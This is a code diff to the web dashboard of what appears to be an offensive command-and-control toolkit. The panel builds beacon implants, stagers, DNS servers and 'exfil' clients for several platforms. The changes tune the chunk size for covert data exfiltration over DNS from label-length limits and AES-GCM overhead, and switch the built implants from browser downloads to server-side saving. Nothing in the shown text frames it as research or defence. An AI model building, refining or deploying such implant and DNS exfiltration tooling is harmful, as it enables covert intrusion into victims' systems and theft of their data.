@@ -260,6 +260,17 @@
             clip-path: polygon(0 0, calc(100% - 6px) 0, 100% 6px, 100% 100%, 0 100%);
         }
 
+        .readonly-chip {
+            background: rgba(255, 51, 51, 0.08);
+            border-left: 2px solid rgba(255, 51, 51, 0.5);
+            border-bottom: 1px solid rgba(255, 51, 51, 0.2);
+            padding: 10px 15px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            color: #f5f5f5;
+            clip-path: polygon(0 0, calc(100% - 6px) 0, 100% 6px, 100% 100%, 0 100%);
+        }
+
         .form-input:focus, .form-select:focus {
             outline: none;
             border-left-color: rgba(255, 51, 51, 0.8);
@@ -564,10 +575,9 @@
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label">Chunk Size (bytes)</label>
-                    <input type="number" id="exfilChunkBytes" class="form-input" value="180" min="64" max="220">
-                    <div class="help-text">Payload per DNS answer. 180 bytes is a safe default.</div>
-                    <div class="help-text" id="exfilChunkHint"></div>
+                    <label class="form-label">Chunk Size (auto)</label>
+                    <div id="exfilChunkHint" class="readonly-chip">Detecting active domains...</div>
+                    <div class="help-text">Chunk bytes are auto-tuned from active DNS domains and enforced server-side.</div>
                 </div>
 
                 <div class="form-group">
@@ -780,7 +790,8 @@
 
         function computeMaxChunkBytes(domains) {
             const DNS_MAX_NAME = 253;
-            const DATA_LABEL_SPLIT = 62;
+            const LABEL_CAP = 62;
+            const METADATA_LABELS = 2;
             const AES_GCM_OVERHEAD = 28;
             const MAX_CHUNK_PROBE = 512;
             const LOG36_OF_2 = Math.log(2) / Math.log(36);
@@ -788,22 +799,16 @@
             const cleaned = (domains || [])
                 .map(domain => domain.trim().replace(/\.$/, ''))
                 .filter(Boolean);
+
             if (cleaned.length === 0) {
                 return 0;
             }
 
-            let longest = 0;
-            cleaned.forEach(domain => {
-                if (domain.length > longest) {
-                    longest = domain.length;
-                }
-            });
-
-            if (DNS_MAX_NAME <= longest + 1) {
+            const longest = cleaned.reduce((max, domain) => Math.max(max, domain.length), 0);
+            const required = (METADATA_LABELS * LABEL_CAP) + 2 + longest;
+            if (required >= DNS_MAX_NAME) {
                 return 0;
             }
-
-            const available = DNS_MAX_NAME - (longest + 1);
 
             const estimateBase36Len = bytes => {
                 if (bytes <= 0) {
@@ -813,25 +818,21 @@
                 return Math.ceil(bits * LOG36_OF_2);
             };
 
-            const nameFits = chunkBytes => {
+            const fitsBudget = chunkBytes => {
                 const cipherLen = chunkBytes + AES_GCM_OVERHEAD;
                 const encodedLen = estimateBase36Len(cipherLen);
-                const labels = Math.ceil(encodedLen / DATA_LABEL_SPLIT);
-                let dataLen = encodedLen;
-                if (labels > 1) {
-                    dataLen += labels - 1;
-                }
-                return dataLen <= available;
+                return encodedLen <= LABEL_CAP;
             };
 
             let best = 0;
             for (let chunk = 1; chunk <= MAX_CHUNK_PROBE; chunk += 1) {
-                if (nameFits(chunk)) {
+                if (fitsBudget(chunk)) {
                     best = chunk;
                 } else {
                     break;
                 }
             }
+
             return best;
         }
 
@@ -847,25 +848,17 @@
                 .filter(Boolean);
 
             if (activeDomains.length === 0) {
-                hint.textContent = 'No active DNS servers yet; chunk size will be normalized at runtime.';
+                hint.textContent = 'No active DNS servers yet. Auto chunk sizing will engage once a server is active.';
                 return;
             }
 
             const maxChunk = computeMaxChunkBytes(activeDomains);
             if (maxChunk <= 0) {
-                hint.textContent = 'Current domain names leave no room for data chunks. Shorten them before building.';
+                hint.textContent = 'Current domain lengths leave no room for data chunks. Shorten them before building.';
                 return;
             }
 
-            hint.innerHTML = `Max safe chunk size for these domains: <strong>${maxChunk} bytes</strong>. Larger values will be clamped automatically.`;
-
-            const chunkInput = document.getElementById('exfilChunkBytes');
-            if (chunkInput) {
-                const current = parseInt(chunkInput.value, 10);
-                if (!Number.isNaN(current) && current > maxChunk) {
-                    chunkInput.value = maxChunk;
-                }
-            }
+            hint.innerHTML = `Auto chunk size derived from DNS label limits: <strong>${maxChunk} bytes</strong> per frame. Larger payloads are segmented automatically.`;
         }
 
         async function loadDNSServers() {
@@ -986,15 +979,11 @@
                 }
 
                 if (response.ok) {
-                    const blob = await response.blob();
-                    const url = window.URL.createObjectURL(blob);
-                    const a = document.createElement('a');
-                    a.href = url;
-                    a.download = `dns-server-${domain}.bin`;
-                    a.click();
-                    window.URL.revokeObjectURL(url);
-
-                    showAlert('DNS server built successfully!', 'success');
+                    const payload = await response.json();
+                    const info = (payload && payload.data) || {};
+                    const note = info.download_path ? ` Saved at ${info.download_path}.` : '';
+                    const message = (payload && payload.message) || 'DNS server build saved.';
+                    showAlert(`${message}${note}`, 'success');
                     await loadDNSServers(); // Refresh server list
                     await loadBuilds(); // Refresh builds list
                 } else {
@@ -1056,16 +1045,11 @@
                 }
 
                 if (response.ok) {
-                    const blob = await response.blob();
-                    const url = window.URL.createObjectURL(blob);
-                    const a = document.createElement('a');
-                    const ext = platform === 'windows' ? '.exe' : '';
-                    a.href = url;
-                    a.download = `beacon-${platform}-${architecture}${ext}`;
-                    a.click();
-                    window.URL.revokeObjectURL(url);
-
-                    showAlert('Client built successfully!', 'success');
+                    const payload = await response.json();
+                    const info = (payload && payload.data) || {};
+                    const note = info.download_path ? ` Saved at ${info.download_path}.` : '';
+                    const message = (payload && payload.message) || 'Client build saved.';
+                    showAlert(`${message}${note}`, 'success');
                     await loadBuilds(); // Refresh builds list
                 } else {
                     const error = await response.json();
@@ -1085,9 +1069,17 @@
                 return;
             }
 
+            const domainNames = activeServers
+                .map(server => (server.domain || '').trim())
+                .filter(Boolean);
+            const chunkBudget = computeMaxChunkBytes(domainNames);
+            if (chunkBudget <= 0) {
+                showAlert('Current domain names leave no room for data chunks. Shorten them before building.', 'error');
+                return;
+            }
+
             const platform = document.getElementById('exfilPlatform').value;
             const architecture = document.getElementById('exfilArchitecture').value;
-            const chunkBytes = parseInt(document.getElementById('exfilChunkBytes').value, 10) || 0;
             const jitterMin = parseInt(document.getElementById('exfilJitterMin').value, 10) || 0;
             const jitterMax = parseInt(document.getElementById('exfilJitterMax').value, 10) || 0;
             const chunksPerBurst = parseInt(document.getElementById('exfilChunksPerBurst').value, 10) || 0;
@@ -1099,7 +1091,7 @@
                 const response = await authFetch('/api/builder/exfil-client', {
                     method: 'POST',
                     body: JSON.stringify({
-                        chunk_bytes: chunkBytes,
+                        chunk_bytes: chunkBudget,
                         jitter_min_ms: jitterMin,
                         jitter_max_ms: jitterMax,
                         chunks_per_burst: chunksPerBurst,
@@ -1114,16 +1106,11 @@
                 }
 
                 if (response.ok) {
-                    const blob = await response.blob();
-                    const url = window.URL.createObjectURL(blob);
-                    const a = document.createElement('a');
-                    const ext = platform === 'windows' ? '.exe' : '';
-                    a.href = url;
-                    a.download = `exfil-${platform}-${architecture}${ext}`;
-                    a.click();
-                    window.URL.revokeObjectURL(url);
-
-                    showAlert('Exfil client built successfully!', 'success');
+                    const payload = await response.json();
+                    const info = (payload && payload.data) || {};
+                    const note = info.download_path ? ` Saved at ${info.download_path}.` : '';
+                    const message = (payload && payload.message) || 'Exfil client build saved.';
+                    showAlert(`${message}${note}`, 'success');
                     await loadBuilds();
                     await loadExfilBuilds();
                 } else {
@@ -1174,16 +1161,11 @@
                 }
 
                 if (response.ok) {
-                    const blob = await response.blob();
-                    const url = window.URL.createObjectURL(blob);
-                    const a = document.createElement('a');
-                    const ext = platform === 'windows' ? '.exe' : '';
-                    a.href = url;
-                    a.download = `stager-${platform}-${architecture}${ext}`;
-                    a.click();
-                    window.URL.revokeObjectURL(url);
-
-                    showAlert('Stager built successfully!', 'success');
+                    const payload = await response.json();
+                    const info = (payload && payload.data) || {};
+                    const note = info.download_path ? ` Saved at ${info.download_path}.` : '';
+                    const message = (payload && payload.message) || 'Stager build saved.';
+                    showAlert(`${message}${note}`, 'success');
                     await loadBuilds(); // Refresh builds list
                 } else {
                     const error = await response.json();
